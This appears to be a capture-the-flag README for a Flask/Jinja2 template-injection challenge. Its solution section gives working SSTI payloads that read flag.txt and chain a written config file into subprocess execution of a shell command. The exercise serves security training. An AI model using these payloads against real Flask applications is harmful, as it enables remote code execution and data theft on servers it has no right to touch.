# Flask Template Injection

Objective is for the player to use template injection to get a shell on the web server and print the flag.

## Setup
Install docker and run `./rundocker.sh`

## Solution
The solution is to use the flask injection vulnerability to read the flag off of the server. More background can be found here: https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html  
and  
https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html

Possible solutions is to put the follwing in one of the text boxes:  
`{{ ''.__class__.__mro__[2].__subclasses__()[40]('flag.txt').read() }}`  
or the following commands seperately:   
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
{{ config.from_pyfile('/tmp/owned.cfg') }}
{{ config['RUNCMD']('cat flag.txt',shell=True) }}
```
